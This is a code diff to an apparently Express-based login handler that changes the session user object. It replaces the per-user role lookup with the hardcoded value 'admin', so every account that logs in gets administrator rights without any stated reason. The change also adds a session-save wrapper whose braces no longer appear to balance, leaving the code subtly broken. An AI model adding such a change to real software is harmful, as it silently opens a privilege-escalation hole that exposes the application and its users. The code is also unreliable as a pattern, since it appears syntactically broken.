@@ -75,14 +75,15 @@ app.post('/login', (req, res) => {
   }
 
   req.session.user = {
-    id: u.id,
-    name: u.name,
-    email: u.email,
-    role: getUserRole(u),
-    balance: u.balance,
-    reseller: u.reseller
-  };
+  id: u.id,
+  name: u.name,
+  email: u.email,
+  role: 'admin',
+  balance: u.balance,
+  reseller: u.reseller
+};
 
+req.session.save(() => {
   res.redirect('/dashboard');
 });
 
